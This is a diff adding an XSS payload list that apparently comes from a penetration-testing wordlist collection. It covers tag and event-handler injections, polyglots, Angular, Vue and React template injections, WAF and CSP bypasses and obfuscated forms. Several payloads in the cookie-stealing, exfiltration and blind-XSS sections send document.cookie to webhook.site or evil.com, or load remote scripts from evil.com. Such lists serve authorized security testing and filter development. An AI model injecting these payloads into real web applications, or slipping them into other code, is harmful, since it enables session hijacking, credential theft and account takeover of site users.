@@ -1,0 +1,333 @@
+# Enhanced XSS (Cross-Site Scripting) Payloads
+# Author: Abdulrahman Muhammad (0xLegacy)
+# Contains payloads for various XSS contexts, modern frameworks, and WAF bypasses
+
+# Basic JavaScript Execution
+<script>alert(1)</script>
+<script>alert('XSS')</script>
+<script>alert(document.domain)</script>
+<script>alert(document.cookie)</script>
+<img src=x onerror=alert(1)>
+<svg onload=alert(1)>
+javascript:alert(1)
+
+# Popular Tag Attribute Context Payloads
+<body onload=alert(1)>
+<svg/onload=alert(1)>
+<img src=x onerror=alert(1)>
+<input autofocus onfocus=alert(1)>
+<iframe onload=alert(1)>
+<video onloadstart=alert(1)><source src=x>
+<audio onloadstart=alert(1)><source src=x>
+<a href="javascript:alert(1)">Click Me</a>
+<details open ontoggle=alert(1)>
+<select autofocus onfocus=alert(1)>
+<marquee onstart=alert(1)>
+<button autofocus onfocus=alert(1)>
+
+# Event Handler Payloads
+onafterprint=alert(1)
+onanimationend=alert(1)
+onanimationiteration=alert(1)
+onanimationstart=alert(1)
+onbeforeprint=alert(1)
+onbeforeunload=alert(1)
+onblur=alert(1)
+oncanplay=alert(1)
+oncanplaythrough=alert(1)
+onchange=alert(1)
+onclick=alert(1)
+oncontextmenu=alert(1)
+oncopy=alert(1)
+oncut=alert(1)
+ondblclick=alert(1)
+ondrag=alert(1)
+ondragend=alert(1)
+ondragenter=alert(1)
+ondragleave=alert(1)
+ondragover=alert(1)
+ondragstart=alert(1)
+ondrop=alert(1)
+ondurationchange=alert(1)
+onended=alert(1)
+onerror=alert(1)
+onfocus=alert(1)
+onfocusin=alert(1)
+onfocusout=alert(1)
+onfullscreenchange=alert(1)
+onfullscreenerror=alert(1)
+onhashchange=alert(1)
+oninput=alert(1)
+oninvalid=alert(1)
+onkeydown=alert(1)
+onkeypress=alert(1)
+onkeyup=alert(1)
+onload=alert(1)
+onloadeddata=alert(1)
+onloadedmetadata=alert(1)
+onloadstart=alert(1)
+onmessage=alert(1)
+onmousedown=alert(1)
+onmouseenter=alert(1)
+onmouseleave=alert(1)
+onmousemove=alert(1)
+onmouseout=alert(1)
+onmouseover=alert(1)
+onmouseup=alert(1)
+onoffline=alert(1)
+ononline=alert(1)
+onpagehide=alert(1)
+onpageshow=alert(1)
+onpaste=alert(1)
+onpause=alert(1)
+onplay=alert(1)
+onplaying=alert(1)
+onpopstate=alert(1)
+onprogress=alert(1)
+onratechange=alert(1)
+onreset=alert(1)
+onresize=alert(1)
+onscroll=alert(1)
+onsearch=alert(1)
+onseeked=alert(1)
+onseeking=alert(1)
+onselect=alert(1)
+onshow=alert(1)
+onstalled=alert(1)
+onstorage=alert(1)
+onsubmit=alert(1)
+onsuspend=alert(1)
+ontimeupdate=alert(1)
+ontoggle=alert(1)
+onunload=alert(1)
+onvolumechange=alert(1)
+onwaiting=alert(1)
+onwheel=alert(1)
+
+# JavaScript Protocol Handlers
+<a href="javascript:alert(1)">Click</a>
+<iframe src="javascript:alert(1)"></iframe>
+<object data="javascript:alert(1)"></object>
+<embed src="javascript:alert(1)">
+<form action="javascript:alert(1)"><input type="submit">
+
+# Polyglot XSS
+javascript:"/*\"/*`/*' /*</template>
+</textarea></noembed></noscript></title></style></iframe>"/'>/*/</script>/--><svg/onload=alert()>//*</title>\";alert();/*</select><img src=x onerror=alert(1)>
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
+"'`><\x3Cimg src=xxx:x onerror=javascript:alert(1)>
+"'`><\x00img src=xxx:x onerror=javascript:alert(1)>
+"'`><\x3Cimg src=xxx:x onerror=javascript:alert(1)>
+"'`><\x00img src=xxx:x onerror=javascript:alert(1)>
+"'`>ABC<div style="font-family:'\x22\x3e\x3cimg src=x onerror=javascript:alert(1)>'">\x3C/div>
+"'`>ABC<div style="font-family:'\x27\x3e\x3cimg src=x onerror=javascript:alert(1)>'">\x3C/div>
+
+# HTML5 XSS
+<video><source onerror="javascript:alert(1)">
+<audio src=x onerror=alert(1)>
+<math><mtext><table><mglyph><svg><mtext><style><img src=x onerror=alert(1)>
+<svg><animate onbegin=alert(1) attributeName=x dur=1s>
+<details ontoggle=alert(1)>
+<svg><set onbegin=alert(1) attributeName=x dur=1s>
+
+# DOM-based XSS
+<img src=1 onerror="location.href='javascript:alert(1)'">
+<script>location.href='javascript:alert(1)'</script>
+<img src=1 usemap=x><map name="x"><area href="javascript:alert(1)">
+<math><mtext><option><FAKEELEMENT><img src="</option></select><img src=x onerror=alert(1)>">
+<math><mtext></form><form><mglyph><svg><mtext><textarea><a title="</textarea><img src=x onerror=alert(1)>">
+<defs><set attributeName="onmouseover" to="alert(1)"/>
+<animate attributeName="onunload" to="alert(1)"/>
+
+# Character Encoding Bypasses
+%253Cscript%253Ealert(1)%253C%252Fscript%253E
+<script>a\u006cert(1)</script>
+<script>\u0061\u006c\u0065\u0072\u0074(1)</script>
+<script>eval('a'+'l'+'e'+'r'+'t(1)')</script>
+<script>window['al'+'ert'](1)</script>
+
+# WAF Bypass Techniques
+<sCr<script>ipt>alert(1)</scRipt>
+<script>window['alert'](0)</script>
+<script>parent['alert'](1)</script>
+<script>self['alert'](2)</script>
+<script>top['alert'](3)</script>
+<a"/onclick=(confirm)()>click
+<a onclick=&quot;['alert'].forEach(a=>window[a](1))&quot;>click
+<svG/x=">"/oNloaD=confirm()//
+<iframe src=javascript:alert(1)>
+<iframe/src=javascript:alert(1)>
+<iframe srcdoc="<svg onload=alert(1)>">
+<svg><script>alert&nbsp;(1)</script>
+<svg><script>alert&#x28;1&#x29</script>
+<svg><script>a\u006Cert(1)</script>
+<script>alert`1`</script>
+<svg onx=() onload=(confirm)(1)>
+<--`<img/src=` onerror=alert(1)> --!>
+<svg %00onload=alert(1)>
+<isindex x="javascript:" onmouseover="alert(1)">
+<div onpointerover="alert(1)">MOVE HERE</div>
+<div onpointerenter="alert(1)">MOVE HERE</div>
+<div onpointerdown="alert(1)">CLICK HERE</div>
+<div onpointerup="alert(1)">CLICK HERE</div>
+
+# Angular/Vue/React XSS
+{{constructor.constructor('alert(1)')()}}
+{{7*7}} -> {{constructor.constructor('alert(1)')()}}
+{{a='constructor';b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,'alert(1)')()}}
+<div ng-app ng-csp><textarea autofocus ng-focus="d=$event.view.document;d.location.hash.match('x1') ? '' : d.location='javascript:alert(1)'"></textarea></div>
+<div ng-app ng-csp><input autofocus ng-focus="$event.path[0].ownerDocument.location='javascript:alert(1)'"></div>
+<div ng-app ng-csp><input autofocus ng-focus="$event.composedPath()[0].ownerDocument.location='javascript:alert(1)'"></div>
+<div ng-app ng-csp><input autofocus ng-focus="$event.target.ownerDocument.location='javascript:alert(1)'"></div>
+<xss class="{{$on.constructor('alert(1)')()}}">
+<xss class="{{constructor.constructor('alert(1)')()}}">
+<input name=name value="<img src=x onerror=alert(1)>">
+
+# Vue XSS (v-bind expressions)
+<div v-bind:onclick="alert(1)">click</div>
+<div v-for="item in [].constructor.constructor('alert(1)')()">test</div>
+<xss v-html="'<img src=x onerror=alert(1)>'"></xss>
+<xss v-for="item in [].constructor.constructor('alert(1)')()">anything</xss>
+
+# JSX/React XSS
+<img src="x" onError={alert(1)} />
+<a href="javascript:alert(1)">click</a>
+<div dangerouslySetInnerHTML={{__html: "<img src=x onerror=alert(1)>"}}></div>
+
+# Fetch/XMLHttpRequest Exfiltration Payloads
+<script>fetch('https://webhook.site/id?c='+document.cookie)</script>
+<script>new Image().src='https://webhook.site/id?c='+document.cookie</script>
+<script>navigator.sendBeacon('https://webhook.site/id',document.cookie)</script>
+<script>var x=new XMLHttpRequest();x.open('GET','https://webhook.site/id?c='+btoa(document.cookie),true);x.send()</script>
+
+# Dangling Markup Injection
+<img src='//evil.com/?
+<a href="//evil.com/?
+
+# Encoding and Obfuscation
+<script>eval(atob('YWxlcnQoMSk='))</script>
+<script>\u0065\u0076\u0061\u006c('alert(1)')</script>
+<script>$=~[];$={___:++$,$$$$:(![]+"")[$],__$:++$,$_$_:(![]+"")[$],_$_:++$,$_$$:({}+"")[$],$$_$:($[$]+"")[$],_$$:++$,$$$_:(!""+"")[$],$__:++$,$_$:++$,$$__:({}+"")[$],$$_:++$,$$$:++$,$___:++$,$__$:++$};$.$_=($.$_=$+"")[$.$_$]+($._$=$.$_[$.__$])+($.$$=($.$+"")[$.__$])+((!$)+"")[$._$$]+($.__=$.$_[$.$$_])+($.$=(!""+"")[$.__$])+($._=(!""+"")[$._$_])+$.$_[$.$_$]+$.__+$._$+$.$;$.$$=$.$+(!""+"")[$._$$]+$.__+$._+$.$+$.$$;$.$=($.___)[$.$_][$.$_];$.$($.$($.$$+"\""+$.$$__+$._$+$.$$_+$.$_$_+"\\"+$.__$+$.$$_+$._$_+$._$+$.$_$_+"("+$.___+")"+"\"")())()</script>
+<script>['ale'+'rt'](1)</script>
+<script>window['evalu'+'ate']('ale'+'rt(1)')</script>
+
+# Custom Event Triggers
+<svg><animate onbegin=alert(1) attributeName=x></animate></svg>
+<svg><animate onrepeat=alert(1) attributeName=x></animate></svg>
+<svg><set onbegin=alert(1) attributeName=x></set></svg>
+<svg><set onrepeat=alert(1) attributeName=x></set></svg>
+
+# Script-less XSS
+<img src=x onerror="document.createElement('script').src='https://evil.com/xss.js'">
+<math><mtext><option><FAKEELEMENT><img src="</option></select><img src=x onerror=alert(1)>">
+<svg><p><style><img src="</style><img src=x onerror=alert(1)>">
+<img src=x:prompt(1) onerror=eval(src)>
+
+# Exotic Contexts
+<xmp><img src=x onerror=alert(1)></xmp>
+<iframe><textarea></textarea><noembed></noembed><iframe>
+<textarea></textarea><noembed><img src=x onerror=alert(1)>
+<link rel="stylesheet" href="javascript:alert(1)">
+<title><a href="</title><img src=x onerror=alert(1)>">
+<body onload="aler\u0074(1)">
+
+# innerHTML XSS
+<script>document.getElementById("demo").innerHTML = "<img src=x onerror=alert(1)>";</script>
+<script>var element = document.getElementById("iAmID");element.innerHTML = "<img src=x onerror=alert(1)>";</script>
+
+# Chained XSS
+<script>var i=document.createElement("iframe");i.srcdoc="<img src=x onerror=parent.alert(1)>";document.body.appendChild(i);</script>
+<script>document.write("<img src=x onerror=alert(1)>");</script>
+
+# Universal XSS
+<script>Object.defineProperty(document, 'getElementById',{value:function(){document.write("<img src=x onerror=alert(1)>")}})</script>
+<script>Object.defineProperty(document, 'getElementById',{value:function(){return {innerHTML: '<img src=x onerror=alert(1)>'}}})</script>
+<script>setTimeout('alert(1)');</script>
+<script>setInterval('alert(1)');</script>
+<script>fetch('https://evil.com/xss.js').then(r=>r.text()).then(eval)</script>
+
+# Modern Storage Abuse
+<script>localStorage.setItem('xss','<img src=x onerror=alert(1)>');</script>
+<script>document.write(localStorage.getItem('xss'));</script>
+<script>sessionStorage.setItem('xss','<img src=x onerror=alert(1)>');</script>
+<script>document.write(sessionStorage.getItem('xss'));</script>
+
+# CSP Bypass
+<script>eval(location.hash.slice(1))</script>
+<script src=data:text/javascript,alert(1)></script>
+<script src=data:application/javascript,alert(1)></script>
+<script src=//evil.com/xss.js></script>
+<script src=https://evil.com/xss.js></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.1.3/angular.min.js"></script>
+
+# Base64 Encoded Payloads
+<script>eval(atob('YWxlcnQoMSk='))</script>
+<script>eval(atob('YWxlcnQoZG9jdW1lbnQuY29va2llKQ=='))</script>
+<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></iframe>
+
+# Browser-specific XSS
+<image/src/onerror=prompt(1)>
+<body/onload=&lt;!--&gt;&#10alert(1)>
+<style></style\x09<img src=xx:x onerror=alert(1)//>\x0A
+
+# DOM Clobbering
+<a id=x><a id=x name=y>
+<a id="dom"><a id="dom" name="clobbering">
+<form id="test" onforminput=alert(1)><input></form><button form="test" formaction="javascript:alert(1)">X</button>
+
+# JSON Hijacking
+<script>Object.prototype.__defineSetter__('x',function(){alert(1)})</script>
+<script>Object.prototype.__defineGetter__('x',function(){alert(1)})</script>
+
+# Custom Protocol Handlers
+<a href="javascript:\u0061lert(1)">click</a>
+<a href="javascript:void(alert(1))">click</a>
+<a href="data:text/html,<script>alert(1)</script>">click</a>
+<a href="vbscript:alert(1)">click</a>
+<a href="data:application/x-javascript,alert(1)">click</a>
+
+# Less Known Tags and Attributes
+<frameset onload=alert(1)>
+<table background="javascript:alert(1)"></table>
+<base href="javascript:alert(1);//">
+<svg><script xlink:href=data:,alert(1)></script></svg>
+<img ismap onmouseover="alert(1)" src="a">
+<menuitem onclick="alert(1)" label="XSS"></menuitem>
+<meter value=2 min=0 max=10 onmouseover=alert(1)>2 out of 10</meter>
+<progress value=50 max=100 onmouseover=alert(1)>50%</progress>
+
+# Multi-step XSS
+<svg><animatetransform onbegin=alert(1)>
+<style><img src="</style><img src=x onerror=alert(1)>">
+<button popovertarget="x">click</button><div id="x" popover>XSS<script>alert(1)</script></div>
+
+# Modern Web APIs 
+<script>const channel = new BroadcastChannel('xss');channel.postMessage({payload:'<img src=x onerror=alert(1)>'});</script>
+<script>navigator.serviceWorker.register('/evil-sw.js');</script>
+<script>if('speechSynthesis' in window){const msg = new SpeechSynthesisUtterance('XSS');window.speechSynthesis.speak(msg);}</script>
+<script>const worker = new Worker('data:application/javascript,postMessage(document.cookie)');</script>
+
+# HTML5 Attributes
+<video controls onplay=alert(1)><source src="http://example.com/video.mp4" type="video/mp4"></video>
+<button autofocus onfocus=alert(1)>test</button>
+<form><button formaction="javascript:alert(1)">click</button></form>
+
+# Cookie-stealing XSS payloads
+<img src=x onerror=this.src='http://evil.com/?c='+document.cookie>
+<script>document.location='http://evil.com/?c='+document.cookie</script>
+<script>fetch('https://evil.com/?c='+document.cookie)</script>
+<script>var i=new Image();i.src='http://evil.com/?c='+document.cookie;</script>
+<script>navigator.sendBeacon('https://evil.com/log',document.cookie)</script>
+
+# Blind XSS payloads for stored contexts
+"><script src=https://evil.com/xss.js></script>
+<script>fetch('https://evil.com/'+document.domain+'/'+document.cookie)</script>
+<script>var req = new XMLHttpRequest();req.open('GET', 'https://evil.com/?c='+btoa(document.cookie), true);req.send();</script>
+<script>$.getScript('https://evil.com/xss.js')</script>
+<script>$.get('https://evil.com/?c='+document.cookie)</script>
+<iframe src="javascript:fetch('https://evil.com/'+document.domain+'/'+document.cookie)"></iframe>
+
+# Self-executing payloads (no user interaction)
+<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>
+<embed src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></embed>
+<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></iframe>
